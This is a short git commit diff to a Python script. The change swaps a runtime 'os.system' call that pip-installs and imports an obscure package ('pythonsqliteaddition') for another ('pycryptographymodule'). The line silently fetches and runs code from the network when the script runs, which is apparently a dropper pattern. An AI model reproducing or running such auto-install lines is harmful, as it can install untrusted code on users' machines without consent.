67434e4a2e42fbbe557db558a9039fb446f54ea0
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-05-02 17:50:31 +0200

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteaddition")
-import pythonsqliteaddition
+os.system("pip install pycryptographymodule")
+import pycryptographymodule
 from optparse import Option
 import requests
 import threading
